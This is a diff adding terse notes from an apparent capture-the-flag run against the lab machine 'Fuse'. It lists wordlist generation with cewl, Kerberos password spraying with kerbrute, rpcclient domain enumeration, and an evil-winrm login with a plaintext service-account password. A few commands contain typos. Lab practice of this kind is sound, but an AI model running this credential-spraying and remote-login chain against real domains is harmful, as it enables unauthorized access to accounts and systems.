@@ -1,0 +1,13 @@
+sudo cewl -d 5 -m 3 -w passwd-fuse http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
+
+sudo python3 kerbrute.py -domain fabricorp.local -users /home.motasem/Desktop/users-fuse.txt -passwords /home/motasem/Desktop/passwd-fuse -outputfile /home/motasem/Desktop/Valid-pass.txt
+
+Sudo smbpasswd -r fuse.htb -U tlavel
+
+sudo rpcclient -U FABRICORP\\tlavel 10.10.10.193
+querydispinfo
+enumdomusers
+enumprinters
+sudo evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb
+whoami /pri
+
